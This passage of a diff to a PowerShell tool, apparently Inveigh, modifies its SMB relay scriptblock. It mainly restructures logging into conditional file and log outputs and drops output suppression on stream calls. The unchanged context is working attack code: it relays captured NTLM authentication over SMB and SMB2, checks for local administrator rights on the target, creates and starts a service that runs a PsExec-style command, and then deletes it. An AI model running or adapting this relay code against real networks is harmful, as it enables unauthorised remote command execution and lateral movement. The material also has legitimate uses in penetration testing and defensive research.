                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadAndXRequest'
                             $SMB_client_stage_next = 'StartServiceW'
                         }
@@ -1933,8 +2025,21 @@ $SMB_relay_response_scriptblock =
 
                             if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')
                             {
+                                
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target")
+                                    $inveigh.log_file_queue.Add("Trying to execute SMB relay command on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target")
+                                    $inveigh.log.Add("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target")
+                                }
+
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service created on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target")])
+                                $inveigh.console_queue.Add("Trying to execute SMB relay command on $Target")
                                 $SMB_service_context_handle = $SMB_client_receive[92..111]
                                 $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
                                 $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle
@@ -1948,19 +2053,27 @@ $SMB_relay_response_scriptblock =
                                 $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                                 $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                 $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
-                                $inveigh.console_queue.Add("Trying to execute SMB relay command on $Target") > $null
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("Trying to execute SMB relay command on $Target")]) > $null
-                                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                                 $SMB_client_stream.Flush()
-                                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                                 $SMB_client_stage = 'ReadAndXRequest'
                                 $SMB_client_stage_next = 'DeleteServiceW'  
                             }
                             elseif([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '31-04-00-00')
                             {
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service creation failed on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target")])
                                 $SMB_relay_failed = $true
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target")
+                                }
+
                             }
                             else
                             {
@@ -1975,12 +2088,32 @@ $SMB_relay_response_scriptblock =
                             if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1d-04-00-00')
                             {
                                 $inveigh.console_queue.Add("SMB relay command executed on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay command executed on $Target")])
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay command executed on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay command executed on $Target")
+                                }
+
                             }
                             elseif([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '02-00-00-00')
                             {
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service failed to start on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("SMB relay service $SMB_service failed to start on $Target")])
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service failed to start on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service failed to start on $Target")
+                                }
+
                             }
 
                             $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
@@ -1995,9 +2128,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadAndXRequest'
                             $SMB_client_stage_next = 'CloseServiceHandle'
                             $SMB_close_service_handle_stage = 1
@@ -2009,9 +2142,19 @@ $SMB_relay_response_scriptblock =
                             if($SMB_close_service_handle_stage -eq 1)
                             {
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service deleted on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target")])
                                 $SMB_close_service_handle_stage++
                                 $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target")
+                                }
+
                             }
                             else
                             {
@@ -2030,9 +2173,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                         }
 
                         'CloseRequest'
@@ -2044,9 +2187,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'TreeDisconnect'
                         }
 
@@ -2059,9 +2202,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'Logoff'
                         }
 
@@ -2074,9 +2217,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'Exit'
                         }
 
@@ -2085,8 +2228,18 @@ $SMB_relay_response_scriptblock =
                     if($SMB_relay_failed)
                     {
                         $inveigh.console_queue.Add("SMB relay failed on $Target")
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay failed on $Target")])
                         $SMB_client_stage = 'Exit'
+
+                        if($inveigh.file_output)
+                        {
+                            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay failed on $Target")
+                        }
+
+                        if($inveigh.log_output)
+                        {
+                            $inveigh.log.Add("$(Get-Date -format 's') - SMB relay failed on $Target")
+                        }
+
                     }
             
                 }
@@ -2114,9 +2267,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'CreateRequest'
                         }
                   
@@ -2134,9 +2287,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'RPCBind'
                         }
                 
@@ -2156,9 +2309,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadRequest'
                             $SMB_client_stage_next = 'OpenSCManagerW'
                         }
@@ -2177,9 +2330,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
 
                             if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                             {
@@ -2194,7 +2347,7 @@ $SMB_relay_response_scriptblock =
 
                         'StatusPending'
                         {
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
 
                             if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                             {
@@ -2219,9 +2372,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadRequest'
                             $SMB_client_stage_next = 'CheckAccess'           
                         }
@@ -2232,10 +2385,19 @@ $SMB_relay_response_scriptblock =
                             if([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                             {
                                 $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")])
                                 $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                                 $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $PsExec_command_bytes $PsExec_command_length_bytes
                                 $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")
+                                }
 
                                 if($SCM_data.Length -lt $SMB_split_index)
                                 {
@@ -2250,8 +2412,18 @@ $SMB_relay_response_scriptblock =
                             elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')
                             {
                                 $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")])
                                 $SMB_relay_failed = $true
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
+                                }
+
                             }
                             else
                             {
@@ -2274,9 +2446,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadRequest'
                             $SMB_client_stage_next = 'StartServiceW'  
                         }
@@ -2299,9 +2471,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             
                             if($SMB_split_stage_final -le 2)
                             {
@@ -2333,9 +2505,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
 
                             if($SMB_split_stage -ge $SMB_split_stage_final)
                             {
@@ -2363,9 +2535,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadRequest'
                             $SMB_client_stage_next = 'StartServiceW'
                         }
@@ -2375,8 +2547,21 @@ $SMB_relay_response_scriptblock =
 
                             if([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '00-00-00-00')
                             {
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target")
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target")
+                                    $inveigh.log.Add("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target")
+                                }
+
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service created on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target")])
+                                $inveigh.console_queue.Add("Trying to execute SMB relay command on $Target")
                                 $SMB_service_context_handle = $SMB_client_receive[112..131]
                                 $SMB2_message_ID += 20
                                 $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
@@ -2392,19 +2577,27 @@ $SMB_relay_response_scriptblock =
                                 $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                                 $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                 $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
-                                $inveigh.console_queue.Add("Trying to execute SMB relay command on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target")])
-                                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                                 $SMB_client_stream.Flush()
-                                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                                 $SMB_client_stage = 'ReadRequest'
                                 $SMB_client_stage_next = 'DeleteServiceW'     
                             }
                             elseif([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '31-04-00-00')
                             {
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service creation failed on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target")])
                                 $SMB_relay_failed = $true
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target")
+                                }
+
                             }
                             else
                             {
@@ -2419,12 +2612,32 @@ $SMB_relay_response_scriptblock =
                             if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
                             {
                                 $inveigh.console_queue.Add("SMB relay command executed on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay command executed on $Target")])
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay command executed on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay command executed on $Target")
+                                }
+
                             }
                             elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
                             {
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service failed to start on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("SMB relay service $SMB_service failed to start on $Target")])
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("SMB relay service $SMB_service failed to start on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("SMB relay service $SMB_service failed to start on $Target")
+                                }
+
                             }
 
                             $SMB2_message_ID += 20
@@ -2441,9 +2654,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadRequest'
                             $SMB_client_stage_next = 'CloseServiceHandle'
                             $SMB_close_service_handle_stage = 1
@@ -2455,10 +2668,20 @@ $SMB_relay_response_scriptblock =
                             if($SMB_close_service_handle_stage -eq 1)
                             {
                                 $inveigh.console_queue.Add("SMB relay service $SMB_service deleted on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target")])
                                 $SMB2_message_ID += 20
                                 $SMB_close_service_handle_stage++
                                 $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target")
+                                }
+
                             }
                             else
                             {
@@ -2479,9 +2702,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                         }
 
                         'CloseRequest'
@@ -2495,9 +2718,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'TreeDisconnect'
                         }
 
@@ -2512,9 +2735,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'Logoff'
                         }
 
@@ -2529,9 +2752,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'Exit'
                         }
 
@@ -2540,8 +2763,18 @@ $SMB_relay_response_scriptblock =
                     if($SMB_relay_failed)
                     {
